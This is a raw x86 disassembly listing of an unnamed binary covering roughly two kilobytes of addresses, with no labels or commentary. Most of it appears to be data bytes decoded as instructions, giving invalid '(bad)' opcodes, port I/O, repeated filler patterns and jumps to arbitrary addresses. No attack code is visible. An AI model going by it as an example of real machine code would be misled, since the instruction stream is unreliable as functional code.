  4146d5:	sub    eax,0xf8a97c0c
  4146da:	iret   
  4146db:	mov    dh,ch
  4146dd:	(bad)  
  4146de:	sti    
  4146df:	sti    
  4146e0:	mov    cl,0x4
  4146e2:	fld    DWORD PTR [ecx-0x48]
  4146e5:	neg    bh
  4146e7:	jg     0x414671
  4146e9:	pop    edx
  4146ea:	mov    dl,0x8a
  4146ec:	popf   
  4146ed:	pop    ebx
  4146ee:	sub    DWORD PTR [eax],edx
  4146f0:	cmp    DWORD PTR [eax],eax
  4146f2:	out    0x3,eax
  4146f4:	cmp    DWORD PTR [eax],eax
  4146f6:	out    0x3,eax
  4146f8:	cmp    DWORD PTR [eax],eax
  4146fa:	out    0x3,eax
  4146fc:	cmp    DWORD PTR [eax],eax
  4146fe:	out    0x3,eax
  414700:	cmp    DWORD PTR [eax],eax
  414702:	out    0x3,eax
  414704:	cmp    DWORD PTR [eax],eax
  414706:	out    0x3,eax
  414708:	cmp    DWORD PTR [eax],eax
  41470a:	out    0x3,eax
  41470c:	cmp    DWORD PTR [eax],eax
  41470e:	out    0x3,eax
  414710:	cmp    DWORD PTR [eax],eax
  414712:	out    0x3,eax
  414714:	cmp    DWORD PTR [eax],eax
  414716:	out    0x3,eax
  414718:	cmp    DWORD PTR [eax],eax
  41471a:	out    0x3,eax
  41471c:	cmp    DWORD PTR [eax],eax
  41471e:	out    0x3,eax
  414720:	cmp    DWORD PTR [eax],eax
  414722:	out    0x3,eax
  414724:	cmp    DWORD PTR [eax],eax
  414726:	out    0x3,eax
  414728:	cmp    DWORD PTR [eax],eax
  41472a:	out    0x3,eax
  41472c:	cmp    DWORD PTR [eax],eax
  41472e:	out    0x3,eax
	...
  414744:	cmp    DWORD PTR [eax],eax
  414746:	out    0x3,eax
  414748:	cmp    DWORD PTR [eax],eax
  41474a:	out    0x3,eax
  41474c:	cmp    DWORD PTR [eax],eax
  41474e:	out    0x3,eax
  414750:	cmp    DWORD PTR [eax],eax
  414752:	out    0x3,eax
  414754:	cmp    DWORD PTR [eax],eax
  414756:	out    0x3,eax
  414758:	cmp    DWORD PTR [eax],eax
  41475a:	out    0x3,eax
  41475c:	cmp    DWORD PTR [eax],eax
  41475e:	out    0x3,eax
  414760:	cmp    DWORD PTR [eax],eax
  414762:	out    0x3,eax
  414764:	cmp    DWORD PTR [eax],eax
  414766:	out    0x3,eax
  414768:	cmp    DWORD PTR [eax],eax
  41476a:	add    cl,ch
  41476c:	cmp    al,BYTE PTR [eax]
  41476e:	add    cl,ch
  414770:	cmp    al,BYTE PTR [eax]
  414772:	add    cl,ch
  414774:	cmp    al,BYTE PTR [eax]
  414776:	add    cl,ch
  414778:	cmp    al,BYTE PTR [eax]
  41477a:	add    ah,ah
  41477c:	inc    eax
  41477d:	add    eax,0x4bea880a
  414782:	mov    ebx,DWORD PTR [bp+si+0x72]
  414786:	das    
  414787:	iret   
  414788:	dec    edx
  414789:	sub    DWORD PTR [eax],esp
  41478b:	leave  
  41478c:	daa    
  41478d:	and    BYTE PTR [eax],ah
  41478f:	jne    0x414773
  414791:	pop    esp
  414792:	and    BYTE PTR [edx-0x30],bl
  414795:	pop    eax
  414796:	ins    BYTE PTR es:[edi],dx
  414797:	dec    ebp
  414798:	fsubr  DWORD PTR [ebp+0x20]
  41479b:	pop    ebp
  41479c:	in     eax,0x5c
  41479e:	and    BYTE PTR [ebx-0x28],cl
  4147a1:	jae    0x414817
  4147a3:	dec    esp
  4147a4:	iret   
  4147a5:	pop    ds
  4147a6:	cmp    dl,BYTE PTR [eax]
	...
  4147bc:	xor    BYTE PTR [esi],al
  4147be:	inc    ecx
  4147bf:	inc    esi
  4147c0:	lods   eax,DWORD PTR ds:[esi]
  4147c1:	outs   dx,DWORD PTR ds:[esi]
  4147c2:	jb     0x414804
  4147c4:	call   0x2761:0x52c97468
  4147cb:	leave  
  4147cc:	gs das 
  4147ce:	aaa    
  4147cf:	shl    DWORD PTR [ecx+0x32],1
  4147d2:	xor    cl,bl
  4147d4:	dec    ebp
  4147d5:	and    BYTE PTR [edx+0x0],ah
  4147d8:	pop    ebp
  4147d9:	dec    edx
  4147da:	ins    DWORD PTR es:[edi],dx
  4147db:	add    al,0x87
  4147dd:	pop    ebp
  4147de:	arpl   WORD PTR [edi],ax
  4147e0:	sbb    eax,0x59fa623f
  4147e5:	data16 sub al,0x9
  4147e8:	jl     0x41484e
  4147ea:	ins    BYTE PTR es:[edi],dx
  4147eb:	or     DWORD PTR [edi+0x66c1655f],eax
  4147f1:	jno    0x414813
  4147f3:	mov    ebx,0x637159
  4147f8:	xor    BYTE PTR [ecx+0x61],0x64
  4147fc:	or     DWORD PTR cs:[edx],ecx
  4147ff:	or     eax,0x726b489a
  414804:	jne    0x414829
  414806:	outs   dx,BYTE PTR gs:[esi]
  414808:	mov    dh,0x6a
  41480a:	jb     0x414879
  41480c:	mov    cl,0x67
  41480e:	outs   dx,DWORD PTR gs:[esi]
  414810:	mov    esi,0xa4682035
  414815:	addr16 jo 0x414852
  414818:	outs   dx,DWORD PTR ds:[esi]
  414819:	sub    dh,BYTE PTR [ebx+0x77]
  41481c:	pop    es
  41481d:	sub    DWORD PTR [ebp+0x62],esp
	...
  414834:	repz pop edi
  414836:	outs   dx,BYTE PTR ds:[esi]
  414837:	jae    0x414828
  414839:	pusha  
  41483a:	je     0x4148b3
  41483c:	icebp  
  41483d:	ins    DWORD PTR es:[edi],dx
  41483e:	popa   
  41483f:	cs repz push 0x69
  414843:	das    
  414844:	pop    ebp
  414845:	add    eax,0x3600a09
  41484a:	add    BYTE PTR [eax],al
  41484c:	push   eax
  41484d:	add    eax,DWORD PTR [eax]
  41484f:	add    BYTE PTR [eax+0x3],dl
  414852:	add    BYTE PTR [eax],al
  414854:	and    BYTE PTR [ebx],al
  414856:	add    BYTE PTR [eax],al
  414858:	and    BYTE PTR [ebx],al
  41485a:	add    BYTE PTR [eax],al
  41485c:	adc    BYTE PTR [ebx],al
  41485e:	add    BYTE PTR [eax],al
  414860:	adc    BYTE PTR [ebx],al
  414862:	add    BYTE PTR [eax],al
  414864:	and    BYTE PTR [ebx],al
  414866:	add    BYTE PTR [eax],al
  414868:	and    BYTE PTR [ebx],al
  41486a:	add    BYTE PTR [eax],al
  41486c:	adc    BYTE PTR [ebx],al
  41486e:	add    BYTE PTR [eax],al
  414870:	adc    BYTE PTR [ebx],al
  414872:	add    BYTE PTR [eax],al
  414874:	loopne 0x414878
  414876:	add    BYTE PTR [eax],al
  414878:	loopne 0x41487c
  41487a:	add    BYTE PTR [eax],al
  41487c:	rol    BYTE PTR [edx],1
  41487e:	add    BYTE PTR [eax],al
  414880:	rol    BYTE PTR [edx],1
  414882:	add    BYTE PTR [eax],al
  414884:	cmp    DWORD PTR [edx+esi*4+0x2028624e],ecx
  41488b:	sub    edi,DWORD PTR ds:0xcd54cf37
  414891:	adc    esp,DWORD PTR [ebx-0x7f419b9e]
  414897:	or     DWORD PTR [eax],eax
	...
  4148a9:	add    BYTE PTR [eax],al
  4148ab:	add    BYTE PTR [esi],al
  4148ad:	hlt    
  4148ae:	or     ecx,DWORD PTR [eax]
  4148b0:	dec    eax
  4148b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b2:	or     ch,BYTE PTR [eax-0x6b]
  4148b5:	mov    al,0x7b
  4148b7:	push   ecx
  4148b8:	(bad)  
  4148b9:	call   0xe97a48bf
  4148be:	add    DWORD PTR [eax],eax
  4148c0:	cmp    ecx,ebp
  4148c2:	add    DWORD PTR [eax],eax
  4148c4:	cmp    ecx,ebp
  4148c6:	add    DWORD PTR [eax],eax
  4148c8:	cmp    ecx,ebp
  4148ca:	add    DWORD PTR [eax],eax
  4148cc:	cmp    ecx,ebp
  4148ce:	add    DWORD PTR [eax],eax
  4148d0:	cmp    ecx,ebp
  4148d2:	add    DWORD PTR [eax],eax
  4148d4:	cmp    ecx,ebp
  4148d6:	add    DWORD PTR [eax],eax
  4148d8:	cmp    ecx,ebp
  4148da:	add    DWORD PTR [eax],eax
  4148dc:	cmp    ecx,ebp
  4148de:	add    DWORD PTR [eax],eax
  4148e0:	cmp    ecx,ebp
  4148e2:	add    DWORD PTR [eax],eax
  4148e4:	cmp    ecx,ebp
  4148e6:	add    DWORD PTR [eax],eax
  4148e8:	cmp    edi,esp
  4148ea:	add    DWORD PTR [eax],eax
  4148ec:	cmp    edi,esp
  4148ee:	add    DWORD PTR [eax],eax
  4148f0:	cmp    edi,esp
  4148f2:	add    DWORD PTR [eax],eax
  4148f4:	cmp    edi,esp
  4148f6:	add    DWORD PTR [eax],eax
  4148f8:	cmp    edi,esp
  4148fa:	add    DWORD PTR [eax],eax
  4148fc:	cmp    edi,esp
  4148fe:	add    DWORD PTR [eax],eax
  414900:	cmp    edi,esp
  414902:	add    DWORD PTR [eax],eax
  414904:	cmp    edi,esp
  414906:	add    DWORD PTR [eax],eax
  414908:	cmp    edi,esp
  41490a:	add    DWORD PTR [eax],eax
  41490c:	cmp    edi,esp
  41490e:	add    DWORD PTR [eax],eax
	...
  414924:	cmp    DWORD PTR [eax],eax
  414926:	out    0x3,eax
  414928:	cmp    DWORD PTR [eax],eax
  41492a:	out    0x3,eax
  41492c:	cmp    DWORD PTR [eax],eax
  41492e:	out    0x3,eax
  414930:	cmp    DWORD PTR [eax],eax
  414932:	out    0x3,eax
  414934:	cmp    DWORD PTR [eax],eax
  414936:	out    0x3,eax
  414938:	cmp    DWORD PTR [eax],eax
  41493a:	out    0x3,eax
  41493c:	cmp    DWORD PTR [eax],eax
  41493e:	out    0x3,eax
  414940:	cmp    DWORD PTR [eax],eax
  414942:	out    0x3,eax
  414944:	cmp    DWORD PTR [eax],eax
  414946:	out    0x3,eax
  414948:	cmp    DWORD PTR [eax],eax
  41494a:	out    0x3,eax
  41494c:	cmp    DWORD PTR [eax],eax
  41494e:	out    0x3,eax
  414950:	cmp    DWORD PTR [eax],eax
  414952:	out    0x3,eax
  414954:	cmp    DWORD PTR [eax],eax
  414956:	out    0x3,eax
  414958:	cmp    DWORD PTR [eax],eax
  41495a:	out    0x3,eax
  41495c:	cmp    DWORD PTR [eax],eax
  41495e:	out    0x3,eax
  414960:	cmp    DWORD PTR [eax],eax
  414962:	out    0x3,eax
  414964:	cmp    DWORD PTR [eax],eax
  414966:	out    0x3,eax
  414968:	cmp    DWORD PTR [eax],eax
  41496a:	out    0x3,eax
  41496c:	cmp    DWORD PTR [eax],eax
  41496e:	out    0x3,eax
  414970:	cmp    DWORD PTR [eax],eax
  414972:	out    0x3,eax
  414974:	cmp    DWORD PTR [eax],eax
  414976:	out    0x3,eax
  414978:	cmp    DWORD PTR [eax],eax
  41497a:	out    0x3,eax
  41497c:	cmp    DWORD PTR [eax],eax
  41497e:	out    0x3,eax
  414980:	cmp    DWORD PTR [eax],eax
  414982:	out    0x3,eax
  414984:	cmp    DWORD PTR [eax],eax
  414986:	out    0x3,eax
	...
  41499c:	cmp    DWORD PTR [eax],eax
  41499e:	out    0x3,eax
  4149a0:	cmp    DWORD PTR [eax],eax
  4149a2:	out    0x3,eax
  4149a4:	cmp    DWORD PTR [eax],eax
  4149a6:	out    0x3,eax
  4149a8:	cmp    DWORD PTR [eax],eax
  4149aa:	out    0x3,eax
  4149ac:	cmp    DWORD PTR [eax],eax
  4149ae:	out    0x3,eax
  4149b0:	cmp    DWORD PTR [eax],eax
  4149b2:	add    cl,ch
  4149b4:	cmp    al,BYTE PTR [eax]
  4149b6:	add    cl,ch
  4149b8:	cmp    al,BYTE PTR [eax]
  4149ba:	add    cl,ch
  4149bc:	cmp    al,BYTE PTR [eax]
  4149be:	add    cl,ch
  4149c0:	cmp    al,BYTE PTR [eax]
  4149c2:	add    cl,ch
  4149c4:	cmp    al,BYTE PTR [eax]
  4149c6:	add    cl,ch
  4149c8:	cmp    al,BYTE PTR [eax]
  4149ca:	add    cl,ch
  4149cc:	cmp    al,BYTE PTR [eax]
  4149ce:	add    cl,ch
  4149d0:	cmp    al,BYTE PTR [eax]
  4149d2:	add    cl,ch
  4149d4:	cmp    al,BYTE PTR [eax]
  4149d6:	add    cl,ch
  4149d8:	cmp    al,BYTE PTR [eax]
  4149da:	add    cl,ch
  4149dc:	cmp    al,BYTE PTR [eax]
  4149de:	add    cl,ch
  4149e0:	cmp    al,BYTE PTR [eax]
  4149e2:	add    al,bl
  4149e4:	inc    esp
  4149e5:	das    
  4149e6:	xor    al,0xd4
  4149e8:	dec    eax
  4149e9:	add    BYTE PTR [eax-0x78],dh
  4149ec:	add    eax,0xec8e756f
  4149f1:	pop    ebx
  4149f2:	add    BYTE PTR [ecx-0x1e],bh
  4149f5:	outs   dx,DWORD PTR ds:[esi]
  4149f6:	bound  ecx,QWORD PTR [ebx+0x4c75653a]
  4149fc:	jmp    0x414a69
  4149fe:	ja     0x4149e9
	...
  414a14:	or     eax,0x81d3132
  414a19:	add    BYTE PTR [edx+0x44],ch
  414a1c:	retf   0x7170
  414a1f:	jmp    0xf5727c29
  414a24:	imul   ebp,DWORD PTR [edx],0x233af135
  414a2a:	xor    bh,dl
  414a2c:	push   esi
  414a2d:	add    BYTE PTR [edi+0xb],bl
  414a30:	call   0x6364:0x3ada3223
  414a37:	sbb    eax,0xff675fa0
  414a3c:	cmp    ch,BYTE PTR [ebx+eiz*2+0x0]
  414a40:	add    esp,DWORD PTR [eax+eax*1+0x6c]
  414a44:	inc    edi
  414a45:	bound  esp,QWORD PTR [ecx+0x0]
  414a48:	mov    cl,0x31
  414a4a:	das    
  414a4b:	add    al,ah
  414a4d:	pop    esp
  414a4e:	outs   dx,DWORD PTR ds:[esi]
  414a4f:	jae    0x414a50
  414a51:	pop    edx
  414a52:	jb     0x414ab8
  414a54:	xor    esp,edi
  414a56:	addr16 gs hlt 
  414a59:	pop    ebx
  414a5a:	imul   eax,DWORD PTR [eax],0xffffff85
  414a5d:	pop    edx
  414a5e:	outs   dx,BYTE PTR ds:[esi]
  414a5f:	imul   ebp,ebp,0x74
  414a62:	add    BYTE PTR [edx+esi*8+0x5c],ah
  414a66:	arpl   WORD PTR [edi+0x76],bp
  414a69:	push   DWORD PTR [ebx+0x72]
  414a6c:	in     eax,dx
  414a6d:	outs   dx,BYTE PTR ds:[esi]
  414a6e:	je     0x414ade
  414a70:	(bad)  
  414a71:	sub    al,0x0
  414a73:	xor    DWORD PTR [ecx+0x2c],esi
  414a76:	sub    eax,0x31
	...
  414a8b:	add    BYTE PTR [ecx-0x1],dh
  414a8e:	fs ins BYTE PTR es:[edi],dx
  414a90:	pop    es
  414a91:	gs popa 
  414a93:	jns    0x414a3c
  414a95:	jo     0x414a97
  414a97:	xor    DWORD PTR [edx-0x51cacbd2],esi
  414a9d:	and    al,BYTE PTR [eax]
  414a9f:	jae    0x414a59
  414aa1:	pop    esp
  414aa2:	outs   dx,DWORD PTR fs:[esi]
  414aa4:	(bad)  
  414aa5:	sti    
  414aa6:	sub    al,0x32
  414aa8:	xor    esi,DWORD PTR [eax]
  414aaa:	xor    DWORD PTR [esi],esi
  414aac:	das    
  414aad:	xor    al,0x35
  414aaf:	add    bl,dh
  414ab1:	arpl   WORD PTR [edx+0x69],si
  414ab4:	add    esi,DWORD PTR [eax+0x0]
  414ab7:	jae    0x414b26
  414ab9:	pop    edx
  414aba:	outs   dx,DWORD PTR ds:[esi]
  414abb:	push   0x615a79
  414ac0:	gs pop ebp
  414ac2:	outs   dx,DWORD PTR ds:[esi]
  414ac3:	je     0x414af2
  414ac5:	outs   dx,BYTE PTR ds:[esi]
  414ac6:	add    BYTE PTR [ebx+0x47],ah
  414ac9:	imul   esi,DWORD PTR [eax+0x75],0x725f1539
  414ad0:	cmp    DWORD PTR [ecx],ebx
  414ad2:	jb     0x414b3b
  414ad4:	pop    DWORD PTR [esi]
  414ad6:	pop    edi
  414ad7:	jno    0x414b43
  414ad9:	jmp    0x297b24b
  414ade:	pop    edi
  414adf:	jb     0x414b1a
  414ae1:	sti    
  414ae2:	fs ins DWORD PTR es:[edi],dx
  414ae4:	gs (bad) 
  414ae6:	fs ins BYTE PTR es:[edi],dx
  414ae8:	gs jmp 0xc497b952
  414aee:	add    BYTE PTR gs:[eax],al
	...
  414b01:	add    BYTE PTR [eax],al
  414b03:	add    BYTE PTR [ebx-0x44],dl
  414b06:	jb     0x414b7b
  414b08:	dec    edx
  414b09:	clc    
  414b0a:	add    DWORD PTR [edi],ebp
  414b0c:	imul   esi,esi,0x34
  414b0f:	xor    ch,BYTE PTR [edx-0x17]
  414b12:	outs   dx,BYTE PTR ds:[esi]
  414b13:	push   0x7660ad18
  414b18:	adc    al,0x97
  414b1a:	add    DWORD PTR [esi+0xb],esp
  414b1d:	jl     0x414b7f
  414b1f:	fs push ds
  414b21:	jl     0x414b24
  414b23:	imul   edx,DWORD PTR [eax],0xb636575
  414b29:	jmp    0x7b1ebc92
  414b2e:	add    DWORD PTR [ecx-0x22],esi
  414b31:	test   DWORD PTR [edx+0x63],esp
  414b34:	jmp    0x414b1e
  414b36:	jb     0x414bab
  414b38:	jmp    0xd8acbd80
  414b3d:	inc    edx
  414b3e:	add    al,0x6b
  414b40:	loopne 0x414b87
  414b42:	ins    BYTE PTR es:[edi],dx
  414b43:	pop    edi
  414b44:	fdiv   QWORD PTR [esp+eax*1]
  414b47:	popa   
  414b48:	rol    DWORD PTR [ebx+0x5d],1
  414b4b:	jno    0x414ae9
  414b4d:	out    0x6a,eax
  414b4f:	outs   dx,BYTE PTR ds:[esi]
  414b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b51:	inc    esp
  414b52:	jb     0x414bc2
  414b54:	pushf  
  414b55:	sub    eax,DWORD PTR [edx+ebp*2]
  414b58:	mov    es,WORD PTR [eax]
  414b5a:	sbb    ch,BYTE PTR [edx+ecx*4+0x5f]
  414b5e:	out    0x5d,eax
  414b60:	mov    bl,BYTE PTR [ebp+0x2]
  414b63:	jnp    0x414af9
  414b65:	imul   esp,edi,0x61
	...
  414b7c:	lea    ebx,[ebx-0x6]
  414b7f:	jo     0x414bdb
  414b81:	pop    esp
  414b82:	out    0x61,eax
  414b84:	mov    gs,WORD PTR [ebp+0xc]
  414b87:	bound  eax,QWORD PTR [esi+0x6803fb64]
  414b8d:	ins    BYTE PTR es:[edi],dx
  414b8e:	enter  0x4c71,0x5f
  414b92:	fnstenv [eax+0x39]
  414b95:	xor    BYTE PTR [edi],dl
  414b97:	xor    al,0x9
  414b99:	xor    BYTE PTR [edi],dl
  414b9b:	add    al,0x49
  414b9d:	imul   edi,DWORD PTR [ecx-0x18a4da8d],0x69
  414ba4:	sbb    al,0x6e
  414ba6:	retf   
  414ba7:	bound  edx,QWORD PTR [edi]
  414ba9:	add    ch,al
  414bab:	bound  edx,QWORD PTR [esi]
  414bad:	ins    BYTE PTR es:[edi],dx
  414bae:	pop    DWORD PTR [ebx]
  414bb0:	or     BYTE PTR [ebx-0x74],ch
  414bb3:	data16 sbb ch,BYTE PTR [esi-0x19]
  414bb7:	bound  ecx,QWORD PTR [eax]
  414bb9:	push   0x65e7b
  414bbe:	mov    DWORD PTR [esi-0x18],ebp
  414bc1:	imul   eax,DWORD PTR [ecx+esi*2+0x628c6839],0xffffffef
  414bc9:	pop    edx
  414bca:	jge    0x414bcf
  414bcc:	jmp    0xdab5a32b
  414bd1:	ins    DWORD PTR es:[edi],dx
  414bd2:	out    0x2c,eax
  414bd4:	add    al,0x29
  414bd6:	push   ds
  414bd7:	sub    eax,0x6be7290c
  414bdc:	retf   0x3b61
  414bdf:	pop    edi
	...
  414bf4:	stos   DWORD PTR es:[edi],eax
  414bf5:	add    BYTE PTR [ebx+0x65],cl
  414bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf9:	pop    ebx
  414bfa:	add    BYTE PTR [ebp-0x5e],al
  414bfd:	add    BYTE PTR [edi+0x3f],bl
  414c00:	cdq    
  414c01:	outs   dx,BYTE PTR ds:[esi]
  414c02:	arpl   WORD PTR [esi],bx
  414c04:	cmp    eax,0x960e686c
  414c09:	push   ecx
  414c0a:	jno    0x414bf5
  414c0c:	fwait
  414c0d:	bound  esp,QWORD PTR [ebp+0x4]
  414c10:	xchg   ecx,eax
  414c11:	outs   dx,DWORD PTR ds:[esi]
  414c12:	add    BYTE PTR [edx],cl
  414c14:	gs push ecx
  414c16:	jb     0x414c25
  414c18:	bound  ebx,QWORD PTR [ebp+0x0]
  414c1b:	or     eax,0x467625a
  414c20:	push   ecx
  414c21:	add    BYTE PTR [edi],ch
  414c23:	sbb    BYTE PTR [edx],cl
  414c25:	and    DWORD PTR [eax],eax
  414c27:	shr    DWORD PTR [edi+0x62],cl
  414c2a:	outs   dx,BYTE PTR ds:[esi]
  414c2b:	shl    BYTE PTR [ebp+ebx*2+0x72],0xe9
  414c30:	dec    ecx
  414c31:	pop    ecx
  414c32:	outs   dx,BYTE PTR ds:[esi]
  414c33:	into   
  414c34:	push   ds
  414c35:	pop    ebp
  414c36:	add    cl,dl
  414c38:	sbb    esp,DWORD PTR [edx+0x6e]
  414c3b:	enter  0x12,0x6f
  414c3f:	enter  0x6b20,0x71
  414c43:	mov    eax,ds:0x995f683a
  414c48:	or     ch,BYTE PTR [ecx+0x0]
  414c4b:	test   BYTE PTR [ebx],bl
  414c4d:	ins    BYTE PTR es:[edi],dx
  414c4e:	jb     0x414bd0
  414c50:	add    al,BYTE PTR [eax]
  414c52:	jo     0x414bdc
  414c54:	jmp    0xc94cc7
	...
  414c69:	add    BYTE PTR [eax],al
  414c6b:	add    bl,bl
  414c6d:	push   eax
  414c6e:	pop    edi
  414c6f:	mov    bl,bl
  414c71:	push   DWORD PTR ds:0x322f0eb4
  414c77:	sbb    BYTE PTR ds:0xdb486b51,bh
  414c7d:	pop    ebx
  414c7e:	pop    edi
  414c7f:	jmp    0x41b5af5c
  414c84:	fsub   QWORD PTR [ecx+0x65]
  414c87:	add    BYTE PTR [eax],ah
  414c89:	pop    ebx
  414c8a:	outs   dx,BYTE PTR gs:[esi]
  414c8c:	ja     0x414ce7
  414c8e:	jb     0x414c90
  414c90:	jge    0x414cf5
  414c92:	je     0x414cfc
  414c94:	jne    0x414d0c
  414c96:	add    BYTE PTR [ebx+0x2e],dh
  414c99:	arpl   WORD PTR [ebx+0x70],bp
  414c9c:	pop    ecx
  414c9d:	add    al,0x6a
  414c9f:	and    esi,DWORD PTR gs:[edi+0x65]
  414ca3:	arpl   WORD PTR [ecx],si
  414ca5:	add    al,0x73
  414ca7:	gs dec esp
  414ca9:	imul   ebp,DWORD PTR [di+0x35],0x4
  414cae:	jo     0x414d1f
  414cb0:	cmp    ebx,DWORD PTR [ecx+0x69]
  414cb3:	outs   dx,DWORD PTR ds:[esi]
  414cb4:	fiadd  WORD PTR [ebx]
  414cb6:	gs ins BYTE PTR es:[edi],dx
  414cb8:	out    dx,eax
  414cb9:	imul   esp,DWORD PTR [ecx+0x79],0x2d68ff
  414cc0:	and    DWORD PTR ds:0x421312d,esi
  414cc6:	imul   esi,DWORD PTR [ebp-0xd],0x776e5d77
  414ccd:	add    ebp,DWORD PTR [eax+0x65]
	...
  414ce4:	jl     0x414d59
  414ce6:	imul   esp,DWORD PTR [ebp-0x70],0xb473714d
  414ced:	dec    esp
  414cee:	outs   dx,BYTE PTR ds:[esi]
  414cef:	add    BYTE PTR [edx-0x4692909c],ch
  414cf5:	popa   
  414cf6:	popa   
  414cf7:	add    bh,bh
  414cf9:	je     0x414d58
  414cfb:	outs   dx,BYTE PTR ds:[esi]
  414cfc:	(bad)  
  414cfd:	pop    eax
  414cfe:	add    BYTE PTR [ebp+esi*4+0x76],dh
  414d02:	je     0x414d6d
  414d04:	mov    esi,0xe061005a
  414d09:	jb     0x414d77
  414d0b:	gs pusha 
  414d0d:	pusha  
  414d0e:	gs arpl ax,bp
  414d11:	pop    eax
  414d12:	ins    BYTE PTR es:[edi],dx
  414d13:	ins    BYTE PTR es:[edi],dx
  414d14:	cmp    DWORD PTR [esp+eax*1],edi
  414d17:	jo     0x414ced
  414d19:	aaa    
  414d1a:	arpl   WORD PTR gs:[ecx],di
  414d1d:	sub    ah,BYTE PTR [edi+0x61]
  414d20:	stos   DWORD PTR es:[edi],eax
  414d21:	inc    esp
  414d22:	js     0x414d24
  414d24:	push   0x98726ad9
  414d29:	cmp    ah,BYTE PTR [edi+0x0]
  414d2c:	mov    ss,WORD PTR [eax]
  414d2e:	pusha  
  414d2f:	ins    BYTE PTR es:[edi],dx
  414d30:	mov    al,ds:0x90005ef8
  414d35:	add    eax,0x10947661
  414d3a:	popa   
  414d3b:	jae    0x414d68
  414d3d:	fstp   DWORD PTR [edi+0x67]
  414d40:	pop    edx
  414d41:	(bad)  
  414d42:	pop    edi
  414d43:	arpl   WORD PTR [ecx],di
  414d45:	scas   eax,DWORD PTR es:[edi]
  414d46:	aaa    
  414d47:	add    BYTE PTR ss:[eax],al
	...
  414d5a:	add    BYTE PTR [eax],al
  414d5c:	daa    
  414d5d:	mov    bh,0x37
  414d5f:	add    BYTE PTR [esp+ecx*8+0x67],ah
  414d63:	pushaw 
  414d65:	mov    edi,0xcd586501
  414d6a:	push   0x1d05875
  414d6f:	data16 sub al,0xba
  414d72:	pop    esi
  414d73:	ja     0x414d93
  414d75:	mov    ah,0x34
  414d77:	add    BYTE PTR [eax],bl
  414d79:	stos   BYTE PTR es:[edi],al
  414d7a:	jbe    0x414de4
  414d7c:	push   cs
  414d7d:	lods   eax,DWORD PTR ds:[esi]
  414d7e:	push   0x59782100
  414d83:	pop    edi
  414d84:	and    DWORD PTR [eax+0x1],edi
  414d87:	jo     0x414d9f
  414d89:	xchg   BYTE PTR [ecx+0x0],dh
  414d8c:	sbb    ebp,DWORD PTR [ebp+0x68]
  414d8f:	jno    0x414d7b
  414d91:	(bad)  
  414d92:	pop    edi
  414d93:	cmp    DWORD PTR gs:[ebx+0x5d],edi
  414d97:	pop    edi
  414d98:	sar    DWORD PTR [edx+0x5d],1
  414d9b:	pop    edi
  414d9c:	rcr    eax,1
  414d9e:	pusha  
  414d9f:	ja     0x414d6b
  414da1:	call   DWORD PTR [esi+0x63]
  414da4:	fsub   DWORD PTR [eax+ebx*1+0x4]
  414da8:	shl    BYTE PTR [eax+0x5b],cl
  414dab:	js     0x414d7e
  414dad:	fs push esi
  414daf:	add    al,0x98
  414db1:	pop    edi
  414db2:	push   ebp
  414db3:	arpl   WORD PTR [ebp-0x618b18a1],dx
  414db9:	pop    esp
  414dba:	cmp    eax,0x3900ab67
  414dbf:	popa   
	...
  414dd4:	fwait
  414dd5:	arpl   WORD PTR [ecx],bx
  414dd7:	js     0x414e12
  414dd9:	pushw  cs
  414ddb:	jbe    0x414d77
  414ddd:	jbe    0x414deb
  414ddf:	jbe    0x414e1a
  414de1:	pop    edi
  414de2:	sbb    ch,BYTE PTR [eax+0x5f]
  414de5:	gs (bad) 
  414de8:	imul   ebx,DWORD PTR [edi+0xa],0x5c
  414dec:	pop    edx
  414ded:	pop    esp
  414dee:	out    0x75,eax
  414df0:	jle    0x414e49
  414df2:	std    
  414df3:	gs fs jne 0x414dde
  414df7:	push   0x62d3574a
  414dfc:	dec    ebx
  414dfd:	add    bh,dl
  414dff:	pop    si
  414e01:	pop    esi
  414e02:	aam    0x77
  414e04:	cmp    DWORD PTR [edx-0x38],esp
  414e07:	ja     0x414e2b
  414e09:	pop    edi
  414e0a:	int    0x3
  414e0c:	sbb    BYTE PTR [ebp-0x3a],bl
  414e0f:	pop    esp
  414e10:	push   ss
  414e11:	arpl   di,sp
  414e13:	not    BYTE PTR gs:[esi-0x6d]
  414e17:	pushw  es
  414e19:	add    BYTE PTR [edx-0x739ee7a0],bl
  414e1f:	jne    0x414e6f
  414e21:	add    BYTE PTR [edx+ebx*2-0x28],bh
  414e25:	pop    eax
  414e26:	mov    WORD PTR [edx+0x39],gs
  414e29:	bound  edx,QWORD PTR [eax+0x5ada77]
  414e2f:	mov    WORD PTR [edx],?
  414e31:	pop    eax
  414e32:	arpl   WORD PTR [ebp-0xa],di
  414e35:	pop    edx
  414e36:	das    
  414e37:	jmp    0x414e3c
	...
  414e4c:	xlat   BYTE PTR ds:[ebx]
  414e4d:	pop    eax
  414e4e:	addr16 dec edi
  414e50:	ficomp WORD PTR [eax+0x0]
  414e53:	dec    ebp
  414e54:	ficom  DWORD PTR [esi+0x6d]
  414e57:	push   ebp
  414e58:	call   0x6e4d:0x8e487100
  414e5f:	xor    eax,0x4a004d85
  414e64:	cwde   
  414e65:	pop    ecx
  414e66:	jo     0x414eb0
  414e68:	mov    al,BYTE PTR [eax]
  414e6a:	adc    BYTE PTR fs:[edx-0x6ef092a7],bl
  414e71:	add    BYTE PTR [eax+ecx*1-0x6e],dh
  414e75:	pop    esp
  414e76:	ins    DWORD PTR es:[edi],dx
  414e77:	sbb    edi,DWORD PTR ds:0x67fb6d66
  414e7d:	pop    ecx
  414e7e:	add    BYTE PTR [ebx],dl
  414e80:	pop    eax
  414e81:	pop    eax
  414e82:	outs   dx,BYTE PTR ds:[esi]
  414e83:	mov    edx,0xfb00362b
  414e88:	jae    0x414ee9
  414e8a:	push   0x6444c8
  414e8f:	retf   
  414e90:	data16 outs dx,BYTE PTR gs:[esi]
  414e93:	ret    0x280b
  414e96:	xor    ch,cl
  414e98:	sub    ah,BYTE PTR [ecx+0x5f]
  414e9b:	retf   0x6112
  414e9e:	jno    0x414e89
  414ea0:	sbb    eax,0x3ac56d5b
  414ea5:	data16 ins BYTE PTR es:[edi],dx
  414ea7:	mov    esi,0xe9726111
  414eac:	add    eax,0x8e6d5f
	...
  414ec1:	add    BYTE PTR [eax],al
  414ec3:	add    BYTE PTR [esi],cl
  414ec5:	popa   
  414ec6:	jb     0x414eb1
